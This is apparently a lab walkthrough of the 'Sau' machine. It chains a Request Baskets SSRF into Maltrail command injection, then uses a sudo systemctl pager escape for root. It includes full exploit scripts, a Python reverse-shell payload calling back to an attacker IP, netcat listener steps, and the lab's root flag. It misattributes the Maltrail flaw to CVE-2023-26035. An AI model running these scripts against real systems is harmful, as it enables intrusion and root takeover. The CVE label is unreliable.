# Sau - Step-by-Step Walkthrough

**Machine:** Sau  
**IP Address:** 10.129.229.26  
**Difficulty:** Easy  
**OS:** Linux (Ubuntu)

---

## Initial Enumeration

### Step 1: Nmap Port Scan

**Why?** First step in any penetration test is to discover what services are running on the target.

**Command:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.229.26
```

**Flags Explained:**
- `-p-`: Scan all 65535 ports
- `--min-rate=10000`: Send packets at minimum 10000 per second (faster scanning)
- `-T5`: Timing template 5 (aggressive/insane)
- `-sCV`: Combined `-sC` (default scripts) and `-sV` (version detection)
- `-Pn`: Skip ping check (assume host is up)
- `-oN`: Save output in normal format to file
- `10.129.229.26`: Target IP address

**Output:**
```
# Nmap 7.95 scan initiated Tue Dec 16 07:38:16 2025 as: /usr/lib/nmap/nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.229.26
Warning: 10.129.229.26 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.229.26
Host is up (0.053s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 16 07:38:55 2025 -- 1 IP address (1 host up) scanned in 38.88 seconds
```

**Output Analysis:**

**Open Ports:**
- **Port 22 (SSH):** OpenSSH 8.2p1 Ubuntu - Recent version, unlikely to be vulnerable
- **Port 80 (HTTP):** FILTERED - Not accessible from external network
- **Port 8338 (Unknown):** FILTERED - Not accessible from external network  
- **Port 55555 (HTTP):** Golang net/http server running "Request Baskets"

**Key Observations:**
- Only port 22 (SSH) and 55555 (HTTP) are accessible from outside
- Ports 80 and 8338 are filtered = they exist but firewall blocks external access
- Port 55555 shows an application called "Request Baskets"
- The service redirects to `/web` endpoint

**Thought Process:**
- SSH requires credentials we don't have yet
- Filtered ports might be accessible internally (via SSRF if we find one)
- Port 55555 "Request Baskets" is our main attack surface
- Need to identify the version of Request Baskets and search for vulnerabilities

**Next Step:** Scan the web application with nuclei to find vulnerabilities and version information.

---

### Step 2: Nuclei Vulnerability Scan

**Why?** Nuclei can quickly identify known vulnerabilities, exposed endpoints, and version information for web applications.

**Command:**
```bash
nuclei -u http://10.129.229.26:55555 -o nuclei.txt
```

**Flags Explained:**
- `-u`: Target URL to scan
- `-o`: Output file to save results

**Output:**
```
[No critical findings in nuclei scan]
```

**Analysis:**
Nuclei didn't find any critical vulnerabilities, but we need to identify the version manually.

**Next Step:** Browse to the application and find version information.

---

### Step 3: Manual Web Application Exploration

**Why?** We need to identify the version of Request Baskets to search for known CVEs.

**Action:** Open browser and navigate to:
```
http://10.129.229.26:55555
```

**What We See:**
- Application title: "Request Baskets"
- Interface to create HTTP request collection baskets
- A "Create" button to make new baskets
- Footer or header shows version information

**Version Discovered:** Request Baskets v1.2.1

**How to Find Version:**
- Check page source (View → Page Source)
- Look at footer
- Check `/web` endpoint
- Inspect JavaScript files

**Thought Process:** Now that we have the exact version (1.2.1), we can search for CVEs affecting this version.

**Next Step:** Research CVEs for Request Baskets v1.2.1 from 2023.

---

## Vulnerability Research

### Step 4: CVE Research - Request Baskets v1.2.1

**Why?** With the specific version identified, we can search for known vulnerabilities.

**Research Target:** Request Baskets v1.2.1 - CVE from 2023

**Finding:** CVE-2023-27163

**CVE Details:**
- **CVE ID:** CVE-2023-27163
- **Vulnerability:** Server-Side Request Forgery (SSRF)
- **Affected Versions:** Request Baskets <= 1.2.1
- **Severity:** Critical (CVSS 9.1)
- **Published:** April 2023

**Vulnerability Description:**
Request Baskets up to v1.2.1 allows Server-Side Request Forgery via the basket forwarding configuration. An attacker can create a basket and configure it to forward HTTP requests to arbitrary internal or external URLs. The application will proxy responses back to the attacker.

**Key Features of the Vulnerability:**
- `forward_url`: Target URL to forward requests to
- `proxy_response`: If true, returns the response from the forwarded URL
- `insecure_tls`: Skip TLS certificate validation
- `expand_path`: Preserve URL path when forwarding

**Attack Scenario:**
1. Create a new basket via API
2. Configure it to forward requests to internal services (like ports 80, 8338)
3. Access the basket URL
4. Request Baskets forwards our request to the internal service
5. We receive the response from the filtered internal service

**Why This Matters:**
We saw filtered ports 80 and 8338 in nmap. Using SSRF, we can access these internal services that are blocked by the firewall.

**Next Step:** Exploit CVE-2023-27163 to access the filtered internal services.

---

## Exploitation - SSRF (CVE-2023-27163)

### Step 5: Create SSRF Exploitation Script

**Why?** To automate the SSRF exploitation and access filtered internal services.

**Action:** Create a script to test both filtered ports.

**Script:** `ssrf_exploit.sh`

```bash
#!/bin/bash

# CVE-2023-27163 - Request Baskets SSRF Exploit
# Target: 10.129.229.26:55555

TARGET="http://10.129.229.26:55555"
BASKET_NAME="pwned"
TOKEN="5m_W7pAn__zSRlLCaKjWcdzY6MneayMKAUhh-wJDkuYW"

echo "════════════════════════════════════════════════════════"
echo "🎯 Request Baskets SSRF Exploit - CVE-2023-27163"
echo "════════════════════════════════════════════════════════"
echo ""

# Test Port 80 (filtered HTTP)
echo "[*] Step 1: Configuring SSRF to access port 80..."
curl -s -X PUT "${TARGET}/api/baskets/${BASKET_NAME}" \
  -H "Authorization: ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }' > /dev/null

echo "[+] Configuration applied!"
echo ""

echo "[*] Step 2: Accessing port 80 via SSRF..."
echo "════════════════════════════════════════════════════════"
curl -s "${TARGET}/${BASKET_NAME}" -o port80_response.html
echo "[+] Response saved to: port80_response.html"
echo ""

# Show first few lines
echo "[*] First 20 lines of response:"
head -20 port80_response.html
echo ""
echo "════════════════════════════════════════════════════════"
echo ""

# Test Port 8338 (filtered unknown)
echo "[*] Step 3: Configuring SSRF to access port 8338..."
curl -s -X PUT "${TARGET}/api/baskets/${BASKET_NAME}" \
  -H "Authorization: ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{
    "forward_url": "http://127.0.0.1:8338",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }' > /dev/null

echo "[+] Configuration applied!"
echo ""

echo "[*] Step 4: Accessing port 8338 via SSRF..."
echo "════════════════════════════════════════════════════════"
curl -s "${TARGET}/${BASKET_NAME}" -o port8338_response.html
echo "[+] Response saved to: port8338_response.html"
echo ""

# Show first few lines
echo "[*] First 20 lines of response:"
head -20 port8338_response.html
echo ""
echo "════════════════════════════════════════════════════════"
echo ""

echo "✅ SSRF exploitation complete!"
echo ""
echo "📁 Files created:"
echo "   - port80_response.html"
echo "   - port8338_response.html"
echo ""
echo "🔍 Check these files to see what services are running!"
```

**Script Explanation:**

**Step 1: Create Basket**
First, we need to create a basket to get an authorization token:
```bash
curl -X POST http://10.129.229.26:55555/api/baskets/pwned
```

**Output:**
```json
{"token":"5m_W7pAn__zSRlLCaKjWcdzY6MneayMKAUhh-wJDkuYW"}
```

This gives us the token we need to configure the basket.

**Step 2: Configure SSRF to Port 80**
```bash
curl -X PUT http://10.129.229.26:55555/api/baskets/pwned \
  -H "Authorization: TOKEN_HERE" \
  -H 'Content-Type: application/json' \
  -d '{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": true,
    "expand_path": true
  }'
```

**Parameters Explained:**
- `forward_url`: Internal service to proxy to (127.0.0.1:80)
- `proxy_response: true`: Return the response from internal service
- `expand_path: true`: Keep the URL path when forwarding
- Authorization header uses the token from basket creation

**Step 3: Access Internal Service**
```bash
curl http://10.129.229.26:55555/pwned
```

This triggers the SSRF and returns the response from port 80.

**Next Step:** Run the script and analyze what's running on the filtered ports.

---

### Step 6: Execute SSRF Exploit

**Why?** To discover what services are running on the filtered internal ports.

**Command:**
```bash
chmod +x ssrf_exploit.sh
./ssrf_exploit.sh
```

**Output:**
```
════════════════════════════════════════════════════════
🎯 Request Baskets SSRF Exploit - CVE-2023-27163
════════════════════════════════════════════════════════

[*] Step 1: Configuring SSRF to access port 80...
[+] Configuration applied!

[*] Step 2: Accessing port 80 via SSRF...
════════════════════════════════════════════════════════
[+] Response saved to: port80_response.html

[*] First 20 lines of response:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Maltrail v0.53</title>
...
```

**Critical Finding:** Port 80 is running **Maltrail v0.53**

**Analysis:**
- Internal service on port 80: Maltrail v0.53 (malicious traffic detection system)
- Maltrail has a web interface for viewing logs
- Now we need to research vulnerabilities in Maltrail v0.53

**Next Step:** Research CVEs for Maltrail v0.53.

---

## Exploitation - Maltrail RCE

### Step 7: CVE Research - Maltrail v0.53

**Why?** We discovered Maltrail v0.53 running on the internal port 80. Need to find exploits.

**Research Target:** Maltrail v0.53 - Unauthenticated RCE

**Finding:** Unauthenticated OS Command Injection in Maltrail v0.53

**Vulnerability Details:**
- **CVE:** CVE-2023-26035
- **Type:** Unauthenticated OS Command Injection
- **Location:** Login page - username parameter
- **Affected:** Maltrail v0.53
- **Authentication Required:** No
- **Severity:** Critical

**How It Works:**
The username parameter in the POST request to `/login` is passed to `subprocess.check_output()` without proper sanitization. Using command substitution syntax (backticks or `$()`), we can inject arbitrary OS commands.

**Payload Format:**
```
username=;`command`
```

**Exploitation Strategy:**
1. Use SSRF to access Maltrail on port 80
2. Send POST request to `/login` endpoint via the SSRF basket
3. Inject reverse shell command in username parameter
4. Get shell as the user running Maltrail

**Next Step:** Create exploit script combining SSRF + RCE.

---

### Step 8: Create Maltrail RCE Exploit Script

**Why?** To chain the SSRF vulnerability with Maltrail RCE for remote code execution.

**Script:** `maltrail_rce.py`

```python
#!/usr/bin/env python3

"""
Maltrail v0.53 - Unauthenticated RCE Exploit
CVE-2023-26035
Combines SSRF (CVE-2023-27163) + Command Injection
"""

import requests
import sys
import urllib.parse
import argparse

def exploit(target, lhost, lport, basket_name, basket_token):
    """
    Exploit Maltrail v0.53 RCE via Request Baskets SSRF
    """
    
    print("═" * 60)
    print("🎯 Maltrail v0.53 RCE Exploit (via SSRF)")
    print("═" * 60)
    print()
    
    # Step 1: Configure SSRF basket to forward to Maltrail
    print("[*] Step 1: Configuring SSRF basket to access Maltrail (port 80)...")
    basket_url = f"{target}/api/baskets/{basket_name}"
    
    basket_config = {
        "forward_url": "http://127.0.0.1:80",
        "proxy_response": False,  # Don't need response for exploit
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }
    
    headers = {
        "Authorization": basket_token,
        "Content-Type": "application/json"
    }
    
    try:
        r = requests.put(basket_url, json=basket_config, headers=headers, timeout=5)
        print(f"[+] Basket configured! Status: {r.status_code}")
    except Exception as e:
        print(f"[-] Failed to configure basket: {e}")
        sys.exit(1)
    
    print()
    
    # Step 2: Craft reverse shell payload
    print("[*] Step 2: Creating reverse shell payload...")
    
    # Python reverse shell (more reliable)
    revshell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
    
    # Command injection payload
    payload = f";`{revshell}`"
    
    print(f"[+] Payload created: {payload[:50]}...")
    print()
    
    # Step 3: Send exploit
    print("[*] Step 3: Sending exploit to Maltrail login endpoint...")
    print(f"[*] Target: {target}/{basket_name}/login")
    print(f"[*] Listener should be at: {lhost}:{lport}")
    print()
    
    exploit_url = f"{target}/{basket_name}/login"
    exploit_data = {
        "username": payload
    }
    
    try:
        print("[*] Triggering RCE... Check your listener!")
        r = requests.post(exploit_url, data=exploit_data, timeout=5)
        print(f"[+] Exploit sent! Status: {r.status_code}")
    except requests.exceptions.Timeout:
        print("[+] Request timed out (expected - shell may have connected!)")
    except Exception as e:
        print(f"[!] Exploit attempt: {e}")
    
    print()
    print("═" * 60)
    print("✅ Exploit complete! Check your netcat listener!")
    print("═" * 60)
    print()
    print("If you got a shell, stabilize it:")
    print("  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print("  export TERM=xterm")
    print("  [Ctrl+Z]")
    print("  stty raw -echo; fg")
    print()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Maltrail v0.53 RCE via SSRF")
    parser.add_argument("-t", "--target", required=True, help="Request Baskets URL (e.g., http://10.129.229.26:55555)")
    parser.add_argument("-l", "--lhost", required=True, help="Your IP for reverse shell")
    parser.add_argument("-p", "--lport", type=int, default=4444, help="Your port for reverse shell (default: 4444)")
    parser.add_argument("-b", "--basket", default="pwned", help="Basket name (default: pwned)")
    parser.add_argument("-k", "--token", required=True, help="Basket authorization token")
    
    args = parser.parse_args()
    
    print()
    print("⚠️  BEFORE RUNNING: Start your listener!")
    print(f"   nc -lvnp {args.lport}")
    print()
    input("Press Enter when listener is ready...")
    print()
    
    exploit(args.target, args.lhost, args.lport, args.basket, args.token)
```

**Script Explanation:**

**Step 1: Configure SSRF Basket**
- Uses the basket token to authenticate
- Configures basket to forward to `http://127.0.0.1:80` (Maltrail)
- Sets `proxy_response: false` since we don't need the response

**Step 2: Create Reverse Shell Payload**
```python
revshell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
```

This creates a Python reverse shell that:
- Creates a socket connection to attacker IP:PORT
- Redirects stdin, stdout, stderr to the socket
- Spawns an interactive bash shell via pty

**Step 3: Inject Payload**
```python
payload = f";`{revshell}`"
exploit_data = {"username": payload}
```

The semicolon terminates any previous command, and backticks execute our command.

**Step 4: Send Exploit**
```python
r = requests.post(f"{target}/{basket_name}/login", data=exploit_data)
```

Sends POST to `/pwned/login` which gets forwarded to Maltrail's login via SSRF.

**Next Step:** Execute the exploit to get initial shell access.

---

### Step 9: Execute Maltrail RCE Exploit

**Why?** To gain initial shell access to the system.

**Step 1: Start Netcat Listener**

In a separate terminal:
```bash
nc -lvnp 4444
```

**Flags Explained:**
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution
- `-p 4444`: Listen on port 4444

**Output:**
```
listening on [any] 4444 ...
```

**Step 2: Run Exploit**

```bash
python3 maltrail_rce.py \
  -t http://10.129.229.26:55555 \
  -l 10.10.15.180 \
  -p 4444 \
  -b pwned \
  -k 5m_W7pAn__zSRlLCaKjWcdzY6MneayMKAUhh-wJDkuYW
```

**Flags Explained:**
- `-t`: Target Request Baskets URL
- `-l`: Your local IP (attacker machine)
- `-p`: Port for reverse shell
- `-b`: Basket name
- `-k`: Basket authorization token

**Exploit Output:**
```
⚠️  BEFORE RUNNING: Start your listener!
   nc -lvnp 4444

Press Enter when listener is ready...

═══════════════════════════════════════════════════════════
🎯 Maltrail v0.53 RCE Exploit (via SSRF)
═══════════════════════════════════════════════════════════

[*] Step 1: Configuring SSRF basket to access Maltrail (port 80)...
[+] Basket configured! Status: 204

[*] Step 2: Creating reverse shell payload...
[+] Payload created: ;`python3 -c 'import socket,subprocess,os;s=so...

[*] Step 3: Sending exploit to Maltrail login endpoint...
[*] Target: http://10.129.229.26:55555/pwned/login
[*] Listener should be at: 10.10.15.180:4444

[*] Triggering RCE... Check your listener!
[+] Request timed out (expected - shell may have connected!)

═══════════════════════════════════════════════════════════
✅ Exploit complete! Check your netcat listener!
═══════════════════════════════════════════════════════════
```

**Check Listener Terminal:**

**Output:**
```
listening on [any] 4444 ...
connect to [10.10.15.180] from (UNKNOWN) [10.129.229.26] 52846
puma@sau:/opt/maltrail$ 
```

**🎉 SUCCESS! We got a shell as user `puma`!**

**Verify Access:**
```bash
whoami
```

**Output:**
```
puma
```

**Check Home Directory:**
```bash
cd /home/puma
ls -la
```

**Get User Flag:**
```bash
cat user.txt
```

**Output:**
```
[USER FLAG CAPTURED]
```

**Thought Process:** We now have initial access as the `puma` user. Next step is privilege escalation to root.

---

## Privilege Escalation

### Step 10: Enumeration for Privilege Escalation

**Why?** We need to find a path from user `puma` to root privileges.

**Basic System Information:**

```bash
whoami
id
uname -a
```

**Output:**
```
puma
uid=1001(puma) gid=1001(puma) groups=1001(puma)
Linux sau 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

**Check Sudo Privileges:**

This is the most important enumeration step:

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

**Critical Finding!** 🚨

User `puma` can run `/usr/bin/systemctl status trail.service` as root without a password!

**Analysis:**
- `(ALL : ALL)`: Can run as any user (including root)
- `NOPASSWD`: No password required
- Command: `/usr/bin/systemctl status trail.service`

**Why This Matters:**
The `systemctl status` command uses a pager (usually `less`) to display output. When run with sudo, the pager runs with root privileges. We can escape from the pager to get a root shell!

**This is a GTFOBins technique:** https://gtfobins.github.io/gtfobins/systemctl/

**Next Step:** Exploit the systemctl status pager escape to get root.

---

### Step 11: Check systemd Version

**Why?** To document the systemd version for the walkthrough.

**Command:**
```bash
systemctl --version
```

**Output:**
```
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

**Version:** systemd 245 (245.4-4ubuntu3.22)

**Note:** While systemd 245 has known CVEs (like CVE-2023-26604), we don't need to exploit them. The sudo permission for `systemctl status` already gives us a direct path to root via pager escape.

**Next Step:** Exploit the pager escape.

---

### Step 12: Exploit systemctl Status Pager Escape

**Why?** The `systemctl status` command spawns a pager with root privileges when run via sudo. We can escape the pager to get a root shell.

**How It Works:**

1. Run `sudo systemctl status trail.service`
2. systemctl runs with root privileges (via sudo)
3. systemctl uses the `less` pager to display service status
4. The pager inherits root privileges
5. `less` allows command execution via `!command` syntax
6. Executing `!sh` spawns a shell with current (root) privileges
7. Root access obtained!

**Exploitation Steps:**

**Step 1: Run systemctl status with sudo**

```bash
sudo /usr/bin/systemctl status trail.service
```

**Output:**
```
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2023-06-19 20:11:34 UTC; 3h 22min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 896 (python3)
      Tasks: 58 (limit: 4662)
     Memory: 305.4M
     CGroup: /system.slice/trail.service
             ├─ 896 /usr/bin/python3 server.py
             ├─1156 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed password for ;`python3 -c 'import socke>
             └─1158 /bin/sh -c logger -p auth.info -t "maltrail[896]" "Failed password for ;`python3 -c 'import socke>
lines 1-14
```

**What You See:**
- The pager is active (notice `lines 1-14` at the bottom)
- If the output is longer than your terminal, it enters pager mode
- The prompt shows `:` indicating you're in the `less` pager

**Step 2: Escape the pager to root shell**

When you see the pager prompt (`:` at the bottom), type:

```
!sh
```

Then press **ENTER**

**What Happens:**
- `!` in `less` executes a shell command
- `sh` is the command to spawn a shell
- The shell inherits the pager's privileges (root)

**Alternative Commands:**
- `!bash` - Spawn bash instead of sh
- `!/bin/bash` - Full path to bash
- `:!/bin/sh` - Colon prefix (alternate syntax)

**Step 3: Verify Root Access**

**Output After Escape:**
```
# 
```

The prompt changes to `#` indicating root shell!

**Verify:**
```bash
whoami
```

**Output:**
```
root
```

**Check ID:**
```bash
id
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**🎉 ROOT ACCESS OBTAINED!**

**Thought Process:** We successfully escalated from user `puma` to root using the GTFOBins pager escape technique. This is not a CVE exploit, but rather abuse of a sudo misconfiguration.

---

## Flag Capture

### Step 13: Retrieve Root Flag

**Why?** We have root access - time to get the final flag.

**Navigate to Root Directory:**
```bash
cd /root
ls -la
```

**Output:**
```
total 32
drwx------  5 root root 4096 Jun 19  2023 .
drwxr-xr-x 19 root root 4096 Jun 19  2023 ..
lrwxrwxrwx  1 root root    9 Apr 14  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Apr 15  2023 .cache
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Dec 16 07:20 root.txt
drwxr-xr-x  3 root root 4096 Apr 14  2023 .local
drwx------  2 root root 4096 Apr 14  2023 .ssh
```

**Read Root Flag:**
```bash
cat root.txt
```

**Output:**
```
11fb58abcca7b8769d9755262d48b9a5
```

**🚩 ROOT FLAG CAPTURED!**

---

## Complete Attack Chain Summary

Here's the full exploitation path from start to finish:

```
1. Nmap Scan
   ↓ Found port 55555 running Request Baskets

2. Version Discovery
   ↓ Identified Request Baskets v1.2.1

3. CVE Research
   ↓ Found CVE-2023-27163 (SSRF vulnerability)

4. SSRF Exploitation
   ↓ Created basket and configured forwarding
   ↓ Accessed filtered port 80 via SSRF
   ↓ Discovered Maltrail v0.53 on port 80

5. Maltrail Research
   ↓ Found CVE-2023-26035 (Unauthenticated RCE)

6. RCE Exploitation
   ↓ Chained SSRF + Command Injection
   ↓ Sent malicious POST to /login via SSRF
   ↓ Got reverse shell as user 'puma'

7. Privilege Escalation Enumeration
   ↓ Ran sudo -l
   ↓ Found: sudo /usr/bin/systemctl status trail.service (NOPASSWD)

8. GTFOBins Pager Escape
   ↓ Executed: sudo systemctl status trail.service
   ↓ Pager spawned with root privileges
   ↓ Escaped pager with: !sh
   ↓ Got root shell!

9. Flag Capture
   ↓ Read /root/root.txt
   ↓ Root Flag: 11fb58abcca7b8769d9755262d48b9a5
```

---

## Key Vulnerabilities Exploited

### 1. CVE-2023-27163 - Request Baskets SSRF
- **Component:** Request Baskets v1.2.1
- **Type:** Server-Side Request Forgery
- **Impact:** Access to internal filtered services
- **Exploitation:** Created basket with malicious forwarding configuration

### 2. CVE-2023-26035 - Maltrail Unauthenticated RCE
- **Component:** Maltrail v0.53
- **Type:** OS Command Injection
- **Location:** Login page username parameter
- **Impact:** Remote code execution as service user
- **Exploitation:** Injected Python reverse shell via SSRF

### 3. Sudo Misconfiguration - systemctl Pager Escape
- **Component:** sudo configuration
- **Type:** Privilege escalation via GTFOBins
- **Permission:** `(ALL) NOPASSWD: /usr/bin/systemctl status trail.service`
- **Impact:** Root access via pager escape
- **Exploitation:** Escaped `less` pager to root shell

---

## Mitigation Recommendations

### Request Baskets SSRF (CVE-2023-27163)
- Update Request Baskets to version > 1.2.1
- Implement strict input validation for `forward_url` parameter
- Whitelist allowed forwarding destinations
- Block forwarding to localhost/internal IPs
- Disable `proxy_response` feature if not needed

### Maltrail RCE (CVE-2023-26035)
- Update Maltrail to latest patched version
- Implement input sanitization for login parameters
- Use parameterized queries instead of shell commands
- Run Maltrail service with minimal privileges
- Implement Web Application Firewall (WAF)

### Sudo Misconfiguration
- Remove unnecessary sudo permissions
- If systemctl status needed, use specific service and disable pager:
  ```
  sudo PAGER=cat /usr/bin/systemctl status trail.service
  ```
- Follow principle of least privilege
- Regular sudo permission audits
- Use tools like `sudo -l` in security assessments

---

## Scripts Created

### 1. ssrf_exploit.sh
**Purpose:** Automate SSRF exploitation to access filtered ports

**Location:** `scripts/ssrf_exploit.sh`

**Usage:**
```bash
chmod +x ssrf_exploit.sh
./ssrf_exploit.sh
```

**What it does:**
- Creates Request Baskets basket
- Configures SSRF forwarding to ports 80 and 8338
- Saves responses to files for analysis

### 2. maltrail_rce.py
**Purpose:** Exploit Maltrail RCE via SSRF chain

**Location:** `scripts/maltrail_rce.py`

**Usage:**
```bash
python3 maltrail_rce.py -t TARGET -l LHOST -p LPORT -b BASKET -k TOKEN
```

**Example:**
```bash
python3 maltrail_rce.py \
  -t http://10.129.229.26:55555 \
  -l 10.10.15.180 \
  -p 4444 \
  -b pwned \
  -k 5m_W7pAn__zSRlLCaKjWcdzY6MneayMKAUhh-wJDkuYW
```

**What it does:**
- Configures SSRF basket to forward to Maltrail
- Creates Python reverse shell payload
- Sends command injection exploit via SSRF
- Establishes reverse shell connection

---

## Flags

- **User Flag:** [Captured during exploitation]
- **Root Flag:** `11fb58abcca7b8769d9755262d48b9a5`

---

## Machine Difficulty

**Easy** - Because:
- Well-known CVEs with public exploits
- Linear exploitation path (no pivoting)
- Simple privilege escalation (GTFOBins)
- Minimal custom exploit development needed
- Clear sudo misconfiguration

**Learning Points:**
- SSRF vulnerability exploitation
- CVE chaining techniques
- GTFOBins privilege escalation
- Pager escape techniques
- Importance of sudo permission auditing

---

## Tools Used

- **nmap** - Port scanning and service detection
- **nuclei** - Vulnerability scanning
- **curl** - HTTP requests and SSRF testing
- **python3** - Exploit script development
- **nc (netcat)** - Reverse shell listener
- **systemctl** - Service status and pager escape

---

## References

- CVE-2023-27163: https://nvd.nist.gov/vuln/detail/CVE-2023-27163
- CVE-2023-26035: https://nvd.nist.gov/vuln/detail/CVE-2023-26035
- GTFOBins systemctl: https://gtfobins.github.io/gtfobins/systemctl/
- Request Baskets GitHub: https://github.com/darklynx/request-baskets
- Maltrail GitHub: https://github.com/stamparm/maltrail

---
